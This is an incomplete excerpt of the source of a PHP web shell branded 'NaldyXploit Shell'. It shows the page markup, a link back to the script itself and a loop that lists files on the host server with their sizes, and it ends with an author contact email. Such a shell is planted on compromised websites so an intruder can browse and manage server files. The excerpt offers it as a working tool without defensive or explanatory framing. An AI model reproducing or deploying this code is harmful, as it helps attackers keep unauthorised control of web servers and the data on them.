...
<html lang="en-US">
		 ...
		 <head>
			 ...
			 <meta name="viewport" content="width=device-width">
				...
				<title>NaldyXploit Shell</title>
				<link rel="icon" href="//g.top4top.io/p_1781xricw3.png" />
		 ...
		 <body>
			 <h1>
				<center>
					<a href="<?php $url=basename($_SERVER['PHP_SELF']);echo $url;?>">NaldyXploitShell<br><img width="300" height="300" src="https://f.top4top.io/p_1750jt8785.png"></a>
				</center>
			 </h1>
...
<?php
 foreach($scandir as $file){if(!is_file("$path/$file"))continue;$size=filesize("$path/$file")/1024;$size=round($size,3);if($size>=1024){$size=round($size/1024,2).' MB';}else{$size=$size.' KB';}echo "					<tr>
			...
			<div class="footer">Hit me [at] <font color="red">perezarif@gmail.com</font></div>
